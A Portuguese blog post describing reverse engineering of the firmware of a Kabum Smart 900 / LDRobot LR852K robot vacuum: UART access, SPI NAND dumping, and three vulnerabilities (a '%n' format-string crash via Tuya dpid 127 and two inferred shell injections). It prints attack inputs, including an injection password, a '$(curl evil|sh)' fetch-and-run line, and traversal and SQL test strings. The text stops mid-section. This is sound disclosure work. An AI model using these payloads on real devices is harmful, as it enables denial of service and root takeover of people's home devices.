---
layout: post
title: "Análise de Segurança de Firmware no Kabum Smart 900 (LDRobot LR852K)"
date: 2026-08-17 12:00:00 -0300
tags: [firmware, iot, reverse-engineering, spi-nand, tuya]
read_min: 66
image: /assets/img/kabum-smart-900-ldrobot-lr852k/img-01.png
---

{% raw %}
**Dispositivo:** Kabum Smart 900 (white-label; o firmware se identifica como LDRobot LR852K, marca de consumo VeniiBOT) **SoC:** Allwinner R328-S3 (sun8iw18, ARM Cortex-A7) **Firmware:** CleanPack3, versão `mr112-LR852K-0_1_12-Release-UDisk` **SDK Tuya:** WiFi+SD SDK V:4.3.1, protocolo LAN 3.3

## 1\. Introdução

Comprei um robô aspirador vendido no Brasil como Kabum Smart 900. Dispositivo barato, com integração Tuya pra controle pelo app. WiFi, LiDAR, aspiração, mop, a proposta padrão do segmento de robôs conectados. Não comprei pra pesquisa. Comprei pra limpar a casa.

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-01.png)

Uma coisa que vale dizer logo de cara, porque explica todas as strings que aparecem daqui pra frente: por fora a caixa diz Kabum Smart 900, mas por dentro o firmware se identifica como **LDRobot LR852K**, com a marca de consumo VeniiBOT. É white-label clássico. A Kabum vende sob marca própria um robô fabricado pela LDRobot (Shenzhen LDRobot), então o board, o framework de firmware (`cleanpack3`) e os domínios (`veniibot.com`) apontam todos pra LDRobot. Quando eu falar "LR852K" no resto do paper, é esse mesmo bicho na sua caixa da Kabum.

Depois de uns meses usando, comecei a pensar no que aquele dispositivo realmente fazia na minha rede. O app Tuya controla tudo: agenda, potência, mapeamento, pacotes de voz. O robô mantém uma conexão MQTT persistente com a nuvem Tuya (porta 8883 TLS, fallback 1883 plaintext). Recebe comandos, manda telemetria, aceita atualizações de firmware OTA. É um computador Linux rodando como root na minha rede doméstica, permanentemente conectado a um servidor chinês, com uma exposição que eu nunca tinha olhado.

Resolvi olhar.

O que se seguiu foram semanas de engenharia reversa: soldagem de fios em chip NAND sob lupa, dumps de 128 MB via SPI, luta contra o Allwinner NFTL que embaralha páginas e impede extração limpa de binários, fuzzing de data points Tuya, e análise estática de strings em ELFs parcialmente corrompidos. No final encontrei três vulnerabilidades. Uma format string confirmada, com DoS demonstrado, e duas injeções de comando OS fortemente inferidas a partir de evidências em rodata e scripts embarcados.

Também apelei para o reddit ([https://www.reddit.com/r/hardwarehacking/comments/1vnpnzc/stuck\_in\_lowprivilege\_uart\_shell\_on\_liectroux\_g7/](https://www.reddit.com/r/hardwarehacking/comments/1vnpnzc/stuck_in_lowprivilege_uart_shell_on_liectroux_g7/)) pois identifiquei os pinos de UART e o restante é desconhecido para mim. Vi que esses robôs geralmente possuem modo FEL e para isso utiliza uma porta USB OTG que não existe no meu. Também não consegui identificar os pads de d+/d- para tentar uma conexão direta via USB, que com modo FEL provavelmente deixaria esse post beeeeem menor e mais produtivo. Vida que segue.

Segue o fio.

* * *

## 2\. Visão Geral do Dispositivo

| Componente | Valor |
| --- | --- |
| SoC | Allwinner R328-S3 (sun8iw18), dual ARM Cortex-A7 @ ~1 GHz (1008 MHz no boot log) |
| RAM | DDR3, 128 MiB, 792 MHz (integrada ao SoC) |
| Flash | XT26G01CWSIG SPI NAND, 1 Gbit (128 MB), 2048+128 bytes/página, WSON8 8x6 mm |
| Bootloader | U-Boot Allwinner (branch tina) |
| Kernel | Linux (build OpenWrt/Linaro GCC 6.4-2017.11) |
| Userspace | Tina Linux (derivado OpenWrt), init procd |
| Board ID | mr112 |
| Console UART | ttyS0, 115200 8N1 |
| Conectividade | WiFi 2.4 GHz (Tuya IoT SDK), sem Bluetooth, sem USB exposto |
| Sensores | LiDAR, bumper, cliff, giroscópio |
| Build CI | Jenkins em `/var/lib/jenkins/workspace/cleanpack3/` |
| SDK de build | `/home/peter/r328_sdk/` |
| Tuya SDK | WiFi+SD SDK V:4.3.1 |

O Allwinner R328 é um SoC de aplicação genérico, encontrado em caixas de som inteligentes, painéis de controle e aparelhos IoT de consumo. Roda ARM Cortex-A7, arquitetura ARMv7-A, com NEON. O firmware é baseado em Tina Linux, a distro OpenWrt que a Allwinner mantém pros seus SoCs. O toolchain é OpenWrt/Linaro GCC 6.4-2017.11, versão 6.4.1. Uma observação já aqui: o boot log do U-Boot reporta CPU a 1008 MHz, então uso esse número em vez do clock máximo de datasheet.

A flash é uma SPI NAND de 1 Gbit da XTX Technology, modelo XT26G01CWSIG. Package WSON8 (8x6 mm), com ECC de 8 bits on-die e spare area de 128 bytes por página. Isso é relevante porque SPI NAND não é SPI NOR. SPI NOR é linear, byte-endereçável, trivial de dumpar. SPI NAND opera em páginas de 2048 bytes com spare area, usa ECC interno, e no caso do Allwinner roda sobre NFTL (NAND Flash Translation Layer), uma camada de mapeamento página a página que embaralha a localização física dos dados. Isso vai ser o maior obstáculo da análise.

O build indica integração contínua Jenkins, com path de workspace apontando pra `cleanpack3`, que é o framework de firmware da LDRobot. O SDK de compilação em `/home/peter/r328_sdk/` confirma que o firmware é compilado a partir do SDK oficial da Allwinner, provavelmente um R328 SDK Tina Linux.

* * *

## 3\. Acesso Físico e UART

### Abrindo o robô

Abrir um robô aspirador não é como abrir um roteador. Roteador tem dois parafusos, uns clipes e uma PCB. Robô aspirador tem parafusos escondidos sob adesivos, clips que parecem de encaixe mas são de pressão, e um empilhamento de módulos que dificulta enxergar o que é PCB principal e o que é PCB de motor.

Removi a tampa inferior, desparafusei o módulo LiDAR e cheguei na PCB principal. Encontrei um header JST de 9 pinos, não vazado, no canto da placa. Debug header clássico de produção, provavelmente o vendor usa pra diagnóstico em fábrica e nunca desabilitou.

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-02.png)

Um detalhe interessante: Após abrir tudo, desmontar completamente, eu percebi que só de tirar a tampa superior e desparafusar o case do LIDAR eu teria acesso a esses pinos de debug lol (a imagem a seguir é um trabalho porco de solda após quebrar o JST, não leve a sério).

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-03.png)

### Identificação dos pinos

Sem silkscreen, fui por multímetro e por tentativa. Dos 9 pinos, identifiquei:

| Pino | Função |
| --- | --- |
| 4 | RX (entrada do SoC) |
| 5 | TX (saída do SoC) |
| 7 | GND |

TX em idle marca 3.3 V constante e oscila durante o boot. RX puxa pull-up fraco. GND dá continuidade com o terra do chassis. Os outros pinos eu não investiguei além do voltímetro. Podem ser JTAG, GPIO de teste ou alimentação.

### Conexão serial

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-04.png)

Conectei via bridge usando um Flipper Zero em UART bridge, com os fios cruzados (TX do alvo no RX do bridge, e vice-versa). Baud rate 115200, configuração 8N1, que é o padrão pra Allwinner. Confirmei posteriomente pelo kernel cmdline que aparece no boot log:

```plaintext
console=ttyS0,115200
```

O boot log saiu limpo, legível, sem caracteres corrompidos. Capturei com `tio`:

```bash
tio -b 115200 -t -l --log-file ~/pesquisa/robo/uart_capture.log /dev/ttyUSB0
```

* * *

## 4\. Reconhecimento Inicial

### U-Boot

O boot começa com o banner do U-Boot Allwinner. Vi o log de inicialização do SoC, a configuração de DRAM, a detecção da NAND flash (`xt26g01c` identificado pelo driver). Tentei interromper o boot pra cair no CLI do U-Boot.

Não consegui.

Mandei `Enter`, `Escape`, `Ctrl+C`, `espaço`, toda combinação que conheço, durante a janela de boot. O bootloader simplesmente ignora. Provavelmente a janela de `bootdelay` está zerada ou a interrupção foi desabilitada no build. Sem acesso ao CLI do U-Boot, perdi a capacidade de dumpar flash por `md.b` (como fiz no TP-Link RE305), de inspecionar o environment e de fazer TFTP boot. O robô boota direto pro Linux.

### Shell de guest

Quando o Linux termina de bootar, o console UART cai num prompt de login. Testei combinações padrão. Root pede senha. Tentei as clássicas de dispositivos chineses: `admin`, `root`, `1234`, `12345`, `password`, `toor`, senha vazia. Nenhuma funcionou.

Insanamente, o robô mesmo sendo chinês não tinha uma senha padrão como as vistas no mercado. Em roteadores baratos da Tenda, da Intelbras, do mercado genérico, a senha root é `admin` ou vazia. Aqui não. Alguém no time da LDRobot fez o mínimo de segurança e colocou uma senha real no root.

Tentei `guest`. Sem senha. Entrou.

O shell do guest é extremamente restrito. Não é um BusyBox completo, não é um `sh` funcional. Dos comandos que testei:

*   `ls`, `cat`, `echo` funcionam
    
*   `ps`, `top`, `netstat` inexistentes ou bloqueados
    
*   `cd /` funciona, mas a maioria dos diretórios relevantes (`/proc`, `/sys`, `/dev`) tem permissões limitadas
    
*   `id` retorna `uid=500(guest)`, sem nenhum grupo privilegiado
    
*   `su root` su não é um suid e não funciona.
    
*   qualquer tentativa de acessar binários do sistema ou listar processos é bloqueada
    

É a diferença entre ter um shell e ter acesso. O guest vê quase nada. Os binários interessantes (`network_proxy_2`, `CleanPackApp`) rodam como root e não são legíveis pelo guest. Os diretórios de configuração em `/userdata/` têm permissões restritas. Consegui ver o hostname, a versão de firmware (`mr112-LR852K-0_1_12-Release-UDisk`) e pouco mais.

A limitação do shell de guest foi o que me empurrou pro caminho do dump de flash. Se eu tivesse root, poderia ter feito `dd if=/dev/mtdX` e extraído tudo limpo. Sem root, a única opção era ir pro hardware.

* * *

## 5\. Extração de Firmware

### O chip

A flash é um XT26G01CWSIG da XTX Technology. SPI NAND, 1 Gbit (128 MB), package WSON8 (8x6 mm). WSON8 é um package plano, sem pinos expostos. Os contatos são pads na parte inferior do chip, rente à PCB.

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-05.png)

### Tentativa com clip (fracasso)

Primeira tentativa foi a abordagem rápida: programador CH341A com clip SOP8/WSON8, leitura in-circuit sem dessoldar. Funciona perfeitamente em SPI NOR com package SOP8, onde os pinos ficam expostos nas laterais do chip e o clip agarra bem.

WSON8 é outra história. Os pads ficam embaixo do chip. O clip de teste que eu tinha simplesmente não conseguia fazer contato confiável. Encostava em um pad, perdia outro. Às vezes lia lixo, às vezes não detectava o chip. Perdi horas tentando posicionar o clip de formas criativas. Não funcionou.

Para complicar ainda mais, toda a placa é revestida com um plástico/silicone que provavelmente seja para proteger a placa de umidade e água (o robô passa pano).

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-06.png)

### Soldagem in-circuit

A solução foi soldar fios diretamente nos pads do chip. Com o chip ainda montado na PCB (in-circuit), soldei micro fios esmaltados nos 8 pads do WSON8 usando ferro de solda com ponta fina e auxílio de lupa. Cada fio com menos de 1 cm entre o pad e um ponto de ancoragem na PCB, pra evitar que tensão mecânica arrancasse a solda.

Os sinais relevantes pra leitura SPI:

| Pino WSON8 | Sinal | Conexão |
| --- | --- | --- |
| 1 | CS# (Chip Select) | CH341A CS |
| 2 | SO/IO1 (Data Out) | CH341A MISO |
| 3 | WP#/IO2 | Pull-up 3.3V |
| 4 | GND | CH341A GND |
| 5 | SI/IO0 (Data In) | CH341A MOSI |
| 6 | CLK | CH341A CLK |
| 7 | HOLD#/IO3 | Pull-up 3.3V |
| 8 | VCC | CH341A 3.3V |

Nada fancy, mas funciona.

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-07.png)

A leitura in-circuit tem um risco: o SoC também está conectado aos mesmos pinos SPI. Se o SoC estiver ativo, ele pode driving o barramento e corromper a leitura. A mitigação é manter o SoC em reset durante a leitura, ou pelo menos garantir que ele não esteja driving os pinos SPI. No meu caso, alimentei o chip pela 3.3 V do CH341A com o robô desligado. O regulador principal do robô ficou inativo, então o SoC não tinha alimentação pra interferir. Funcionou, mas é a abordagem rude. Em cenários mais limpos, dessoldar o chip seria mais seguro.

### SNANDer e o dump

Usei o SNANDer, ferramenta open-source de leitura e escrita de SPI NAND (além de NOR e EEPROM) via CH341A, pra ler a flash. O SNANDer suporta SPI NAND, detectou o XT26G01CWSIG pelo JEDEC ID e fez o dump completo de 128 MB:

```bash
./SNANDer -r dump.bin
```

O dump levou uns 20 minutos. 128 MB de dados brutos, incluindo a spare area de 128 bytes por página (usada pra ECC e metadados do NFTL).

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-08.png)

### Validação: dois dumps

Fiz dois dumps independentes (desconectei, reconectei, re-dumpei) e comparei:

```bash
sha256sum dump.bin dump2.bin
# 00ea975770c88095c2c780b02b3b675879ef104078cf41e14647a43c12c08fa8  dump.bin
# 00ea975770c88095c2c780b02b3b675879ef104078cf41e14647a43c12c08fa8  dump2.bin
```

Checksums idênticos. A leitura é determinística e a soldagem está boa. Se houvesse contato intermitente ou interferência do SoC, os dumps divergiriam. Dois dumps iguais significam leitura confiável.

* * *

## 6\. Análise do Firmware

### O problema do NFTL

Aqui começou o inferno.

Em dispositivos com SPI NOR (como o TP-Link RE305 que analisei antes), a flash é linear. Byte 0 do dump é o byte 0 da flash. Binwalk roda, extrai squashfs, pronto. Análise direta.

Em dispositivos com SPI NAND sob Allwinner, a história é completamente diferente. O Allwinner usa um NFTL proprietário que faz mapeamento página a página. As páginas lógicas que o sistema operacional vê não estão nas mesmas posições físicas no chip. O NFTL redistribui páginas pra wear leveling, bad block management e garbage collection. O dump bruto que eu tenho é a visão física da flash, com as páginas embaralhadas.

Na prática, isso significa que:

1.  **Strings em rodata são legíveis.** Strings de texto ficam dentro de páginas individuais, e a maioria cabe em uma única página de 2048 bytes. O NFTL embaralha a ordem das páginas, mas o conteúdo de cada página está intacto. `strings` no dump bruto funciona perfeitamente.
    
2.  **Binários ELF não são extraíveis de forma limpa.** Um ELF de 1.9 MB ocupa centenas de páginas. O NFTL embaralha a ordem dessas páginas. Os headers ELF ficam na primeira página (intactos), mas as seções de código (.text) estão distribuídas em páginas fora de ordem. O binário não disassembla corretamente.
    
3.  **O filesystem UBI/UBIFS não é montável.** O dump bruto não contém os metadados OOB no formato que o `ubireader` espera. Seria necessário um dump com os dados OOB separados, ou acesso ao device vivo pra extrair via `dd` das partições MTD.
    

Essa é a razão pela qual as vulnerabilidades de injeção de comando estão classificadas como STRONGLY INFERRED em vez de CONFIRMED. Eu consigo ver as strings formatadoras, os imports de `system()`, a ausência de sanitização, mas não consigo disassemblar o fluxo de instruções pra provar que `snprintf` alimenta `system()` diretamente, porque as páginas de código estão embaralhadas pelo NFTL.

### O que funcionou

Apesar do NFTL, a análise estática por strings foi extremamente produtiva. O dump de 128 MB contém toda a informação textual do firmware:

*   **Source annotations.** Paths completos de arquivos-fonte como `network_proxy_2/src/base/wifi_config_base.cpp` e `network_proxy_2/src/logic/voice_package.cpp`. O compilador embarcou as anotações de `__FILE__` nos binários.
    
*   **Format strings.** Comandos shell completos como `sh /data/bin/cleanpack_mode -m sta -s "%s" -p "%s"` e `rm -rf %s/%s && tar -zxf %s/%s -C %s && cp %s/Q001.mp3 %s/`.
    
*   **Log messages.** Strings de debug que documentam o fluxo: `"wifi cmd %s"`, `"voicd package apply cmd: %s"`, `"wifi pwd is less than 8 char"`.
    
*   **Import tables.** As tabelas de símbolos dinâmicos dos ELFs ficam nas primeiras páginas e sobrevivem ao NFTL. Pude listar imports como `system()`, `__snprintf_chk`, `__printf_chk`, `__stack_chk_fail`.
    
*   **Shell scripts.** Scripts embarcados no filesystem aparecem como texto plano no dump. Encontrei `cleanpack_mode`, scripts de boot, configs do sistema.
    
*   **Password hashes.** O `/etc/shadow` aparece em texto claro no dump.
    

O NFTL também causa duplicação. O wear leveling copia páginas pra diferentes blocos físicos, então a mesma string aparece em múltiplos offsets do dump. Isso inicialmente confunde (por que a string aparece 5 vezes?), mas na prática funciona como confirmação. Se um format string aparece em 5 offsets distintos com o mesmo conteúdo, é certamente código de produção, não dead code nem string remanescente de uma versão anterior.

### Extração parcial de ELFs

Consegui extrair ELFs parciais buscando por magic bytes (`\x7fELF`) no dump e recortando a partir daí. Os headers ELF, program headers e tabelas de símbolos ficam no início do arquivo e geralmente estão na mesma página ou em páginas consecutivas que por acaso não foram reorganizadas. Extraí 25 binários únicos, dos quais os mais relevantes:

| Binário | Tamanho | Tipo | Identificação |
| --- | --- | --- | --- |
| network\_proxy\_2 | ~1.9 MB | ELF dinâmico | Daemon principal de rede, Tuya SDK |
| CleanPackApp | ~540 KB | ELF estático | Aplicação principal do robô |
| voice package lib | ~100 KB | ELF dinâmico | Biblioteca de pacotes de voz |

Os headers e imports desses ELFs são legíveis. As seções de código não são. As instruções ARM estão em páginas embaralhadas. É possível disassemblar trechos individuais de uma página, mas não reconstituir o fluxo de controle entre páginas.

### Ferramentas

*   **SNANDer.** Dump da SPI NAND via CH341A.
    
*   **strings + grep.** Análise principal de rodata e scripts embarcados.
    
*   **hexdump / xxd.** Inspeção binária de offsets específicos.
    
*   **readelf.** Leitura de headers e import tables dos ELFs extraídos.
    
*   **Python.** Scripts de extração e correlação de offsets.
    
*   **Radare2.** Tentativa de disassembly, limitada pelo NFTL.
    

* * *

## 7\. Postura de Segurança da Plataforma

Antes de entrar nas vulnerabilidades específicas, vale documentar o que a plataforma faz certo e o que não faz. Isso contextualiza o impacto real de cada achado.

### FORTIFY\_SOURCE, presente e ativo

O toolchain GCC 6.4 compilou os binários com `FORTIFY_SOURCE`. Confirmei pela presença de funções hardened nas tabelas de importação.

**network\_proxy\_2 (daemon principal):**

```plaintext
__memcpy_chk
__printf_chk
__snprintf_chk
__sprintf_chk
__vsnprintf_chk
__strcpy_chk
__stack_chk_fail
__stack_chk_guard
```

**voice package library:**

```plaintext
__fdelt_chk
__memcpy_chk
__snprintf_chk
__stack_chk_fail
__stack_chk_guard
```

As funções `_chk` são as versões hardened da glibc que verificam buffer overflows e format string abuse em runtime. `__stack_chk_fail` e `__stack_chk_guard` são o mecanismo de stack canary. A presença desses símbolos nos imports dinâmicos significa que eles são de fato chamados, não é código morto.

Isso tem implicação direta na VD-01 (format string). O `%n` em format strings controladas pelo atacante é bloqueado pelo FORTIFY. A glibc detecta `%n` em segmento writable e chama `abort()`, produzindo SIGABRT em vez de SIGSEGV. O impacto é DoS (crash), não RCE (execução de código). Mais detalhes na seção da vulnerabilidade.

### O que está ausente

*   **Nenhuma sanitização de entrada pra shell commands.** Não encontrei nenhuma função com nome sugestivo de sanitização (`escap`, `sanitiz`, `filter`, `quot`, `shell`) nos binários analisados. Os format strings de comando shell usam `%s` direto.
    
*   **Verificação de integridade de pacotes só com MD5.** Downloads de pacotes de voz são verificados com MD5 apenas. Sem assinatura criptográfica (RSA, ECDSA, Ed25519). MD5 não é verificação de autenticidade.
    
*   **Root everywhere.** Os serviços principais rodam como root. O `network_proxy_2` processa dados de rede como root. O `system()` que ele chama executa como root. Não há separação de privilégios, não há containers, não há seccomp. Compromisso do daemon é root completo no device.
    

### GCC e toolchain

```plaintext
OpenWrt/Linaro GCC 6.4-2017.11 6.4.1
```

GCC 6.4 é de 2017. Não é antigo a ponto de ser escandaloso (já vi kernel 2.6.36 de 2010 no TP-Link RE305), mas está a várias gerações major de distância das mitigações modernas. O `-fstack-protector-strong` está presente (evidenciado pelos canaries), o `FORTIFY_SOURCE` está presente (nível 1 ou 2), mas mitigações como CFI (Control Flow Integrity) e shadow call stacks exigem GCC 8+ ou Clang.

* * *

## 8\. VD-01: Format String em Tuya dpid 127

**CWE:** CWE-134 (Use of Externally-Controlled Format String) **Confiança:** CONFIRMED, DoS demonstrado com 3 crashes independentes **CVSS 3.1:** 6.5 (`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`)

### Contexto

O protocolo Tuya define "data points" (dpids) como canais de dados entre o app e o dispositivo. Cada dpid tem um ID numérico e transporta dados em formato JSON. O dpid 127 é usado pelo LR852K pra receber informações do app, processadas pelo handler `HandleRawData` no daemon `network_proxy_2`.

### Descoberta

Montei um harness de fuzzing que enviava payloads variados pro dpid 127 e observava o comportamento do daemon pelo log serial. Strings longas, JSON aninhado, caracteres especiais, SQL injection, path traversal, integer overflow, e format specifiers. Dos 30+ payloads enviados, a maioria foi processada normalmente.

Os payloads com `%n` causaram crash imediato.

### Crashes documentados

Sessão de fuzz em **19 de maio de 2026, 06:36 às 06:47 UTC**:

| # | Hora (UTC) | Payload | Latência | Sinal |
| --- | --- | --- | --- | --- |
| 1 | 06:38:38.780 | `{"fmt": "%n%n%n%n%n%n%n%n"}` (infoType 21030) | 148 ms | SIGABRT (6) |
| 2 | 06:44:15.881 | `{"fmt": "%n"}` (infoType 21019) | 157 ms | SIGABRT (6) |
| 3 | 06:46:49.407 | `{"ts": "%n%n%n%n"}` em envelope dInfo (infoType 21019) | 71 ms | SIGABRT (6) |

O crash log extraído do dump NAND (byte offset 27531686):

```plaintext
06:38:38.780 — Sent: {"fmt": "%n%n%n%n%n%n%n%n"} via dpid 127, infoType 21030
06:38:38.928 — Process crashed: thread info dump (utils.cpp:394)
               /tmp/AppRom/libsoc.so(+0x69434) [0xb6ec9434]
               /lib/libc.so.6(__default_sa_restorer+0) [0xb687f450]
06:38:39.192 — [NP 2026/5/19 06:38:39.192 F][main.cpp:28] Network Proxy Start.
```

O `Network Proxy Start` 264 ms depois do crash confirma o restart automático pelo `system_monitor`.

### Controles negativos

Payloads que NÃO causaram crash:

*   `%99999999s` processado normalmente (tentativa de ler muitos bytes da stack, mas sem write)
    
*   `$(id)` processado como string literal
    
*   `` `id` `` idem
    
*   `;id;` idem
    
*   `../../../etc/passwd` idem
    
*   INT64\_MIN, 2^128 processados sem erro
    
*   JSON aninhado profundo processado
    
*   Buffer de 4096 "A"s processado
    
*   `' OR 1=1 --` processado
    

Nenhum payload sem `%n` causou crash. A especificidade é diagnóstica: `%n` é o único format specifier que **escreve** na memória, os outros só leem. O fato de que somente `%n` causa crash, em todos os testes, confirma sem ambiguidade que dados do usuário estão sendo passados como format string pra uma função da família `printf`.

### Multi-field

O crash #3 usou `%n` no campo `"ts"` do envelope JSON, não no campo `"data"`. Múltiplos campos JSON são vulneráveis. O parser provavelmente itera sobre os campos e processa cada valor com a mesma função de logging ou processamento que usa o valor como format string.

### Análise do sinal: SIGABRT, não SIGSEGV

Os três crashes produziram SIGABRT (sinal 6). Se `%n` estivesse de fato escrevendo em memória (a primitiva de RCE clássica de format string), o sinal seria SIGSEGV (sinal 11), escrita em endereço inválido derivado da stack.

SIGABRT significa que algo chamou `abort()` antes do write acontecer. Quem faz isso é a glibc com `FORTIFY_SOURCE`: quando `__printf_chk` (ou `__vsnprintf_chk`, etc.) detecta `%n` em um format string que reside em segmento writable (stack, heap), ela aborta com a mensagem `*** %n in writable segment detected ***`.

Confirmação via import table do `network_proxy_2`:

```plaintext
__printf_chk        (printf hardened pelo FORTIFY)
__snprintf_chk      (snprintf hardened)
__sprintf_chk       (sprintf hardened)
__vsnprintf_chk     (vsnprintf hardened)
```

O fluxo é:

```plaintext
Dados do usuário com %n
  -> passados como format string
__printf_chk() ou __vsnprintf_chk()
  -> detecta %n em segmento writable
  -> glibc chama abort()
SIGABRT
  -> process crash
system_monitor detecta
  -> restart automático (~260 ms)
```

**Implicação.** A vulnerabilidade de format string é real, dados do usuário SÃO o format string. Mas a primitiva de escrita (`%n`) está bloqueada pelo FORTIFY. O impacto confirmado é DoS: crash repetível, automático, via rede. RCE via `%n` por esta via específica é improvável.

### Vetor de ataque

O dpid 127 é acessível via Tuya MQTT (internet). Qualquer usuário do app com acesso ao dispositivo (PR:L, precisa de conta Tuya vinculada) pode enviar payloads arbitrários pro dpid 127. Cada `%n` causa crash, e o daemon reinicia em ~260 ms. Enviando payloads mais rápido que o ciclo de restart, um atacante mantém DoS persistente. O robô fica inacessível, não responde a comandos, perde conectividade.

### CVSS

`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H = 6.5`

*   **AV:N.** Acessível pela internet via MQTT Tuya.
    
*   **AC:L.** Trivial, o payload é uma string JSON.
    
*   **PR:L.** Precisa de conta Tuya com acesso ao dispositivo.
    
*   **UI:N.** Sem interação do usuário necessária.
    
*   **C:N/I:N.** FORTIFY bloqueia a primitiva de escrita, sem leak e sem modificação confirmados.
    
*   **A:H.** Crash completo do processo, repetível.
    

* * *

## 9\. VD-02: Injeção de Comando OS via WiFi SSID/Password

**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command) **Confiança:** STRONGLY INFERRED, evidência de strings + imports + script independente; disassembly bloqueado pelo NFTL **CVSS 3.1:** 7.1 (`AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)

### Contexto

Quando o app Tuya configura o WiFi do robô, ele envia SSID e senha via protocolo LAN Tuya (porta 6668). O robô recebe esses valores, interpola num comando shell e executa via `system()`.

### Evidência no binário (network\_proxy\_2)

As strings seguintes foram encontradas no rodata do binário principal, em offsets múltiplos (5+ cópias NFTL):

```plaintext
Offset 0xae2264: "wifi_control.cpp"
Offset 0xae22c8: "called %s, ssid %s, pwd %s"
Offset 0xae2328: "wifi pwd is less than 8 char"
Offset 0xae2348: "wifi pwd is more than 64 char"
Offset 0xae2368: "WifiControl::Connect2Ap over(bg exec)"
Offset 0xae242c: sh /data/bin/cleanpack_mode -m sta -s "%s" -p "%s"
Offset 0xae2498: sh /data/bin/cleanpack_mode -m sta -s "%s" -p "%s" --segment="%s" --hide="%d"
Offset 0xae254c: "wifi cmd %s"
Offset 0xae25e0: "WifiControl::ResetWifi,cmd [%s]"
```

O padrão é clássico:

1.  A função `WifiControl::Connect2Ap` recebe SSID e senha.
    
2.  Valida apenas o comprimento da senha (8 a 64 caracteres), sem filtro de caracteres.
    
3.  Interpola via `snprintf` no template `sh /data/bin/cleanpack_mode -m sta -s "%s" -p "%s"`.
    
4.  Loga o comando construído como `"wifi cmd %s"`.
    
5.  Passa pra `system()`.
    

A tabela de imports confirma: `system()` presente no PLT, `__snprintf_chk` presente. Sem imports de `exec*` ou `posix_spawn`. Sem strings de sanitização no binário inteiro.

### Evidência no script cleanpack\_mode (dump offset 0x48cfc09)

O script shell que recebe o comando confirma a ausência de sanitização:

```sh
-s | --ssid)
    AP_STA_SSID=$2    # atribuição direta, sem filtro
    shift 2
    ;;
```

Usado depois como:

```sh
/data/bin/ap_client "$AP_STA_SSID" "$AP_STA_PWD"
echo "$AP_STA_SSID" >/data/cfg/ap_name
sh /data/bin/apDemo --ssid="$AP_STA_SSID" ...
```

As aspas duplas em torno de `$AP_STA_SSID` não previnem injeção de comando. Em shell, `"$var"` previne word splitting e globbing, mas não previne substituição de comando (`$(cmd)`) nem a quebra de aspas se o valor contém `"`.

### Mecanismo de injeção

O format string C coloca SSID e senha entre aspas duplas: `-s "%s" -p "%s"`. Uma aspa dupla no valor quebra a delimitação:

```plaintext
Senha:     12345678"; id; echo "
Comando:   sh /data/bin/cleanpack_mode -m sta -s "SSID" -p "12345678"; id; echo ""
Shell vê:  cleanpack_mode (com -p "12345678"), depois id, depois echo ""
```

### O campo de senha como vetor preferido

O SSID tem limitação de 32 bytes pelo padrão IEEE 802.11, provavelmente enforced pelo `wpa_supplicant` downstream. Mas a senha tem validação explícita de 8 a 64 caracteres no código, e nenhuma validação de conteúdo. Um payload de 21 caracteres como `12345678"; id; echo "` satisfaz o requisito de comprimento mínimo e injeta comando arbitrário. A senha oferece até 64 caracteres de espaço pra payload, mais que suficiente pra `$(curl evil|sh)`.

### Classificação de evidência

| Claim | Status |
| --- | --- |
| Format string com %s não-sanitizado pra SSID/senha | **PROVEN**, 5+ duplicatas NFTL |
| Única validação é comprimento da senha | **PROVEN**, sem strings de filtro |
| system() é o único mecanismo de execução | **PROVEN**, tabela de imports |
| cleanpack\_mode recebe SSID sem sanitização | **PROVEN**, script fonte |
| snprintf alimenta system() | **STRONGLY INFERRED**, rodata + imports |
| App Tuya filtra caracteres especiais | **UNKNOWN**, não verificável sem teste |

### Caveats

*   A cadeia `snprintf -> system()` é inferida pela sequência de rodata e imports, não por trace de instruções ARM. A mesma limitação do NFTL.
    
*   O app Tuya ou o SDK podem filtrar caracteres especiais do SSID/senha antes de enviar. Isso mitigaria o vetor via app, mas não via API LAN direta.
    
*   O vetor é rede adjacente (LAN, porta 6668). Durante o modo AP de pareamento, não é necessário o `localKey` Tuya, e qualquer dispositivo na rede pode enviar comandos.
    

### CVSS

`AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 7.1`

*   **AV:A.** Adjacência LAN ou proximidade em AP-mode.
    
*   **PR:L.** Precisa do `localKey` Tuya, exceto durante pareamento.
    
*   **C:H/I:H.** Se a injeção executa, é root shell no device.
    

* * *

## 10\. VD-03: Injeção de Comando OS via Nome de Pacote de Voz

**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command) **Confiança:** STRONGLY INFERRED, evidência de strings + script independente + imports; disassembly bloqueado pelo NFTL **CVSS 3.1:** 8.1 (`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`)

### Contexto

O robô suporta pacotes de voz customizáveis, frases em diferentes idiomas pra anunciar status ("limpeza iniciada", "voltando pra base", etc.). Os pacotes são baixados via MQTT da nuvem Tuya, verificados apenas com MD5, e o nome/ID do pacote é interpolado sem sanitização em comandos `rm`, `tar`, `cp` e `mv` que são passados pra `system()`.

### Evidência na biblioteca de voz (~100 KB, ELF dinâmico)

```plaintext
Offset 0xa018: rm -rf %s/%s && tar -zxf %s/%s -C %s && cp %s/Q001.mp3 %s/
Offset 0x9fc4: "mv voice package to save cmd is"
Offset 0xa0bc: "voicd package apply cmd: %s"    (o typo 'voicd' é do binário original)
Offset 0xa0e8: "mv  package to tmp cmd is: %s"
Offset 0xa054: network_proxy_2/src/logic/voice_package.cpp
Offset 0xa208: {"voip_cur" : "%s"}
```

O fluxo de dados:

```plaintext
Tuya Cloud (MQTT 8883/TLS ou 1883/plaintext)
  -> comando "downloadAndApply" com metadata do pacote de voz
VoicePackageBase::DownloadFileCheckAndApply()
  source: network_proxy_2/src/base/voice_package_base.cpp
  -> download pra /tmp/voip_tmp
HttpsBase::DownloadAndCheck()
  verificação: MD5 only (sem assinatura)
  -> move pra /userdata/cfg/music/sys/<pkg_id>
voice_package.cpp, construção do comando shell:
